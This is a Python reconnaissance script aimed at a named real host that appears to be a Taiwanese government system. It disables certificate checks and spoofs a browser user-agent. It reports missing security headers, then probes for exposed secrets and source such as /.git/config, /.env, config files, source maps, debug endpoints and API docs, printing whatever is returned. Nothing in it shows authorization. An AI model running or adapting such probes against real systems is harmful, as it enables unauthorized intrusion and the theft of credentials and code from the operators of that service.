import requests, urllib3
urllib3.disable_warnings()
S = requests.Session(); S.verify=False
UA={"User-Agent":"Mozilla/5.0"}

print("===== SECURITY HEADERS =====")
for base in ["https://epcr.tpf.gov.tw:4000","https://epcr.tpf.gov.tw:4002","https://epcr.tpf.gov.tw:4004"]:
    try:
        r=S.get(base+"/", timeout=12, headers=UA)
        hs=r.headers
        for h in ["Strict-Transport-Security","X-Frame-Options","X-Content-Type-Options","Content-Security-Policy","X-XSS-Protection","Referrer-Policy","Permissions-Policy"]:
            v=hs.get(h)
            print(f"  {base} {h}: {v if v else 'MISSING'}")
    except Exception as e:
        print(f"  {base} ERR {e}")
    print()

print("===== SOURCE MAP / SERVER SOURCE LEAK =====")
for base in ["https://epcr.tpf.gov.tw:4000","https://epcr.tpf.gov.tw:4002","https://epcr.tpf.gov.tw:4004"]:
    for p in ["/js/app.js.map","/js/LoginCtrl.js.map","/js/services.js.map","/app.js.map","/app.js","/server.js",
              "/config.js","/config.json","/.git/config","/.git/HEAD","/package.json","/package-lock.json",
              "/lib/app.js","/routes/index.js","/models/index.js","/bin/www","/webpack.config.js",
              "/env","/.env","/debug","/processes","/metrics","/actuator/health","/swagger.json","/api-docs"]:
        try:
            r=S.get(base+p, timeout=8, headers=UA, allow_redirects=False)
            ct=r.headers.get("content-type","")
            if r.status_code not in (404,403):
                print(f"  [{r.status_code}] {base}{p} :: {ct[:30]} {r.text[:70]!r}")
        except Exception:
            pass
print("done headers/maps")
